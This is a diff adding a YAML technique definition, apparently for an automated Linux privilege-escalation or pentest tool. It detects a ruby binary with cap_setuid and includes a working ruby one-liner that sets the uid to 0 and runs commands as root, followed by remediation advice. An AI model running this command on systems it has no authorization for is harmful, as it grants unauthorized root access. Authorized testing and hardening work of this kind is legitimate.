@@ -1,0 +1,28 @@
+# cap_setuid on ruby → root
+technique: T1548.001
+name: cap_setuid on ruby → root
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  capability_on_binary:
+    binary: ruby
+    cap: cap_setuid
+execute:
+  command: "{{binary}} -e 'Process::Sys.setuid(0);system(\"id\")'"
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: capability
+  evidence: "getcap: {{binary}} cap_setuid"
+  description: >
+    Ruby with cap_setuid can promote to uid=0 via
+    Process::Sys.setuid(0), then shell out as root.
+  remediation: >
+    Remove the capability (`setcap -r $(which ruby)`).
+  refs: [T1548.001, capabilities(7), setcap]
